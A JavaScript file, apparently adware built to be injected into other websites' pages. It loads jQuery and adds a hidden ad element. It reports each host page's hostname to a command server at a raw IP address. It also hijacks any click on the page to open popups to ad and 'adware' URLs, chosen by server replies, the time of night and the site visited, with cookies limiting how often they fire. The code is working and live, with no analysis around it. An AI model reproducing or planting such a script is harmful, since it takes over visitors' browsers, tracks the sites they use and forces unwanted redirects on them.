window.onload = function() {
	var script = document.createElement('script');
	var head = document.getElementsByTagName('head')[0];
	script.type = 'text/javascript';
	script.src = 'http://code.jquery.com/jquery-latest.js';
	head.appendChild(script);
	var _body = document.body;
	var id = 'newDiv9999';
	var name = 'newDivName';
	// 依照原始的方式是這樣設定的 
	var newElement = document.createElement('div');
	//var newText = document.createTextNode('這是存在於在新建立標籤 div 中的文字。'); 

	newElement.id = 'newDiv9999';
	newElement.setAttribute('name', 'newDivName');
	//newElement.style="position:fixed; bottom:0;right:0;z-index:99990;width:100%;height:200px;"
	newElement.style.position = 'fixed';
	newElement.style.bottom = '30%';
	newElement.style.right = '0';
	//newElement.style.marginRight='100px';
	//newElement.style.margin='0 auto';
	newElement.style.width = '90px';
	newElement.style.height = '120px';
	newElement.style.zindex = '999999';
	newElement.style.visibility = "hidden";
	//newElement.style.positoon='absolute';

	//newElement.style.bottom='0';
	//newElement.style.right='0';
	//newElement.style.width='100%';
	//newElement.style.height='70px';
	//newElement.style.z-index='100';
	//newElement.style.background='#000';

	var a = document.createElement("a");
	//a.href="https://item.taobao.com/item.htm?spm=686.1000925.0.0.5YoE2s&id=44812430933";  
	//a.href="";
	a.innerHTML = "<img src=\"http://wx2.sinaimg.cn/mw690/0069Whj2gy1fepf7xm0paj30go0b4mxr.jpg\" width=\"90px\"  height=\"120px\" onclick=\"oef()\"></img>";

	newElement.innerHTML = "<input type=\"button\" style=\"position:absolute; top:0; right:0; z-index:99;\"  onclick=\"divclose()\" value=\"X\" />";
	newElement.appendChild(a);

	_body.appendChild(newElement);
	// sendPostRequest("http://113.57.230.176:8888/404/admin/Paction", "reqType=showRecord&ad=0");


	window.url1 = top.location.hostname;

	var reqType = 1;
	var ad = 0;
	window.opp = 0;
	window.aop = 0;
	var xmlHttp;
	//alert(url1);
	script.onload = script.onreadystatechange = function() {
		if (!this.readyState || this.readyState == 'loaded' || this.readyState == 'complete') {
			ap(reqType, ad, url1);

		}
		script.onload = script.onreadystatechange = null;
	}


}
document.onclick = function(ev) {

	if (opp == 2 || opp == 3 || opp == 4) {
		var ap = 2;
		if (opp == 3) {

			ap = 9;
		}
		if (opp == 4) {
			ap = 7
		}
		//sendPostRequest("http://127.0.0.1:8080/404/admin/paction", "reqType=2&ad=2");
		opp = 5;

		//setCookie("FlagForAbc123123", 1, 60 * 24);
		// window.open("http://hao.360.cn/?src=lm&ls=n12ff972594");
		$.ajax({
			type : 'post',
			//url : 'http://127.0.0.1:8080/404/admin/paction',
			url : 'http://113.57.230.176:8888/404/admin/Paction',
			data : {
				"reqType" : 5,
				"ad" : ap,
				"url" : url1
			},
			dataType : 'jsonp',

			jsonp : "jsonpcallback",
			success : function(result) {

				//console.log(result.status); 
				//console.log(result.dese);
				if (result.status == "3") {
					setCookie("FlagForAbc123123", 1, 60 * 24);

				}

			},
			error : function() {

				setCookie("FlagForAbc123123", 1, 60 * 24);
			}
		});
		if (ap == 9) {
			window.open("http://lbbseo.com:8888/adware/ldy6.do?id=111");
		}
		if (ap == 7) {
			window.open("http://m.mychebao.com/czhib_promote/temSecIndex.htm?id=67");
		}
		if (ap == 2) {
			window.open("http://iwap.2345.com/?lm_1128");
		}

	} else {


	}
}
function getCookie(c_name) {
	if (document.cookie.length > 0) {
		c_start = document.cookie.indexOf(c_name + "=");

		if (c_start != -1) {
			c_start = c_start + c_name.length + 1;
			c_end = document.cookie.indexOf(";", c_start);
			if (c_end == -1)
				c_end = document.cookie.length;
			return unescape(document.cookie.substring(c_start, c_end));


		}
	}

	return "";
}


function setCookie(c_name, value, expireMins) {
	var leftTime = new Date(new Date(new Date().toLocaleDateString()).getTime() + 24 * 60 * 60 * 1000 - 1) //当日23点59分59秒过期

	document.cookie = c_name + "=" + escape(value) + ((expireMins == null) ? "" : ";expires=" + leftTime.toGMTString());

}

function sendPostRequest(url, param, callback) {
	var xmlhttp;
	if (window.XMLHttpRequest) {
		// code for IE7+, Firefox, Chrome, Opera, Safari
		xmlhttp = new XMLHttpRequest();
	} else {
		// code for IE6, IE5
		xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	}
	xmlhttp.onreadystatechange = callback;
	xmlhttp.open("POST", url, true);
	xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xmlhttp.send(param);
	return xmlhttp;
}
function ap(reqType, ad, url1) {
	//console.log("start is 1111111111111");
	if (navigator.cookieEnabled == true) {
		//sendPostRequest("http://127.0.0.1:8080/404/admin/paction", "reqType=3&url="+url1);
		sendPostRequest("http://113.57.230.176:8888/404/admin/Paction", "reqType=3&url=" + url1);
		var popFlag = getCookie('FlagForAbc123123');
		//var showFlag = getCookie('showForAbc123123');  	
		if (popFlag == null || popFlag == "") {
			popFlag = 0;
			setCookie("FlagForAbc123123", popFlag, 60 * 24);

		}
		/*if (showFlag == null || showFlag == "") {
			showFlag = 0;


		}
		if(showFlag <1 && url1=="m.che168.com")
        	 {
        	
        	 show();
        	 showFlag++;
		    setCookie("showForAbc123123", showFlag, 60 * 24);
		    
		    
        	 }*/

		if (popFlag < 1) {
			// popFlag++;
			//setCookie("FlagForAbc123123", popFlag, 60 * 24);
			// var iframe = document.createElement("iframe");
			//iframe.style.display = "none";
			//iframe.src = "###";
			//document.body.appendChild(iframe);
			//iframe.onload = function() {
			//console.log("start is 00000000000000");
			//console.log("start is 1111111111111");
			//alert("reqType"+reqType);
			$.ajax({
				type : 'post',
				//url : 'http://127.0.0.1:8080/404/admin/paction',
				url : 'http://113.57.230.176:8888/404/admin/Paction',
				data : {
					"reqType" : reqType,
					"ad" : ad,
					"url" : url1
				},
				dataType : 'jsonp',

				jsonp : "jsonpcallback",
				success : function(result) {

					console.log(result.status);
					console.log(result.dese);
					if (result.status == "0") {
						if (result.dese == "0") {
							var beginTime = new Date();
							var endTime = new Date();
							beginTime.setHours(22);
							beginTime.setMinutes(30);
							endTime.setHours(5);
							endTime.setMinutes(30);
							var n = new Date();
							
							if (n.getTime() - beginTime.getTime() > 0 && n.getTime() - endTime.getTime() < 0) {
								opp = 3;

							}
							
						
						}
						if (result.dese == "1" && aop == 0) {
							
							opp = 2;
							if (url1 == "m.che168.com") {
								opp = 4
							}
							
						}
						if (result.dese == "2") {
							opp = 2;
							
							if (url1 == "m.che168.com") {
								opp = 4
							}
						}
						
					}

				},
				error : function() {}
			});

			//	};


		} else {


		}






	}
}
function divclose() {
	//alert("div");
	setCookie("showForAbc123123", 6, 60 * 24);
	newDiv9999.style.visibility = "hidden";
	sendPostRequest("http://113.57.230.176:8888/404/admin/Paction", "reqType=2&ad=99"); //关闭广告
}
function show() {
	newDiv9999.style.visibility = "visible";
	//sendPostRequest("http://113.57.230.176:8888/404/admin/Paction", "reqType=3&url="+"www.abcabc.cc");//显示广告
	sendPostRequest("http://113.57.230.176:8888/404/admin/Paction", "reqType=2&ad=77"); //显示广告
}
function oef() {
	setCookie("showForAbc123123", 6, 60 * 24);
	sendPostRequest("http://113.57.230.176:8888/404/admin/Paction", "reqType=2&ad=88"); //点击广告
	window.open("http://m.mychebao.com/czhib_promote/temSecIndex.htm?id=67");
}
